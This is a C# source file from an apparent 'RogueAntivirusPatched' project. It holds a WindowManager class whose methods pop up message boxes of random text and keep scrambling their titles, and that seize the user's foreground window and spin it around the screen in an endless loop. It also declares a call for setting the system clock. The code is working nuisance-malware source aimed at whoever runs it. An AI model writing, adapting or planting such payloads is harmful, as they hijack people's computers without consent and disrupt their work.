using RogueAntivirusPatched.Advertisement;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows;

namespace RogueAntivirusPatched.Classes
{
    internal class WindowManager
    {
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();
        [DllImport("kernel32.dll")]
        static extern int GetProcessId(IntPtr handle);
        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hwnd, StringBuilder text, int count);
        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool SetWindowText(IntPtr hwnd, String text);
        [DllImport("user32.dll")]
        public static extern bool IsWindow(IntPtr hWnd);

        enum WindowFlags
        {
            SWP_ASYNCWINDOWPOS = 0x4000,
            SWP_DEFERERASE = 0x2000,
            SWP_DRAWFRAME = 0x0020,
            SWP_FRAMECHANGED = 0x0020,
            SWP_HIDEWINDOW = 0x0080,
            SWP_NOACTIVATE = 0x0010,
            SWP_NOCOPYBITS = 0x0100,
            SWP_NOMOVE = 0x0002,
            SWP_NOOWNERZORDER = 0x0200,
            SWP_NOREDRAW = 0x0008,
            SWP_NOREPOSITION = 0x0200,
            SWP_NOSENDCHANGING = 0x0400,
            SWP_NOSIZE = 0x0001,
            SWP_NOZORDER = 0x0004,
            SWP_SHOWWINDOW = 0x0040,
        }

        [DllImport("user32.dll", EntryPoint = "SetWindowPos")]
        private static extern IntPtr SetWindowPos(IntPtr hwnd, IntPtr hwndinsertafter, int x, int y, int cx, int cy, WindowFlags flags);
        [DllImport("user32.dll")]
        public static extern long GetWindowRect(IntPtr hwnd, ref Rectangle rect);

        private static Random rand = new Random();
        public static string RandomAscii(int size)
        {
            // 65 - 123 is A-Z and some special symbols(?)
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < size; i++)
                sb.Append((char)(rand.Next(0, 123) % 255));
            return sb.ToString();
        }

        private static MessageBoxImage[] images =
        {
            MessageBoxImage.None,
            MessageBoxImage.Information,
            MessageBoxImage.Question,
            MessageBoxImage.Warning,
            MessageBoxImage.Error,
            MessageBoxImage.Information,
            MessageBoxImage.Question,
            MessageBoxImage.Error,
        };

        // More stable than (MessageBoxButton)rand.Next(0, 4)
        private static MessageBoxButton[] buttons =
        {
            MessageBoxButton.OK,
            MessageBoxButton.OKCancel,
            MessageBoxButton.YesNoCancel,
            MessageBoxButton.YesNo
        };

        public void EvilMessagebox()
        {
            string title = RandomAscii(16);
            MessageBoxButton button = buttons[rand.Next(0, buttons.Length)];
            MessageBoxImage image = images[rand.Next(0, images.Length)];
            Task.Run(() => MessageBox.Show(RandomAscii(rand.Next(10, 10000)), title, button, image));

            Task.Run(() => {
                StringBuilder sb = new StringBuilder();
                IntPtr handle;
                int repeat = 20;
                do
                {
                    Task.Delay(100).Wait();
                    handle = GetForegroundWindow();
                    GetWindowText(handle, sb, 256);
                    repeat--;
                    if (repeat < 0) return;
                } while (sb.ToString() != title);
                while (IsWindow(handle))
                {
                    Task.Delay(100).Wait();
                    SetWindowText(handle, RandomAscii(16));
                }
            });
        }

        public void SpiralWindow()
        {
            Task.Run(() =>
            {
                while (true)
                {
                    // Settings for spiral
                    double angle_step = 0.1; // Speed of rotation
                    double radius_step = 0.5; // Speed of shrinking
                    double radius = 30.0;

                    IntPtr hwnd = IntPtr.Zero;
                    int tries = 10;
                    do
                    {
                        Task.Delay(100).Wait();
                        hwnd = GetForegroundWindow();
                        tries--;
                        if (tries < 0) return;
                    } while (hwnd == IntPtr.Zero || !IsWindow(hwnd));

                    Rectangle window = Rectangle.Empty;
                    GetWindowRect(hwnd, ref window);
                    if (window == Rectangle.Empty) return;
                    double center_x = (SystemParameters.PrimaryScreenWidth - window.Width) / 2,
                            center_y = (SystemParameters.PrimaryScreenHeight - window.Height) / 2;

                    double cur_angle = 0.0, cur_radius = 0.0;
                    while (IsWindow(hwnd))
                    {
                        hwnd = GetForegroundWindow();
                        cur_radius = Math.Sin(cur_angle / 5) * 5 * radius;
                        double x = (center_x + cur_radius * Math.Cos(cur_angle));
                        double y = (center_y + cur_radius * Math.Sin(cur_angle));

                        SetWindowPos(hwnd, IntPtr.Zero, (int)x, (int)y, 0, 0, WindowFlags.SWP_NOSIZE | WindowFlags.SWP_NOZORDER);

                        cur_angle += angle_step;
                        cur_radius += radius_step;
                        Task.Delay(10).Wait();
                    }
                }
            });
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SystemTime
        {
            public short Year;
            public short Month;
            public short DayOfWeek;
            public short Day;
            public short Hour;
            public short Minute;
            public short Second;
            public short Milliseconds;
        }
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool SetSystemTime(ref SystemTime systemtime);
    }
}
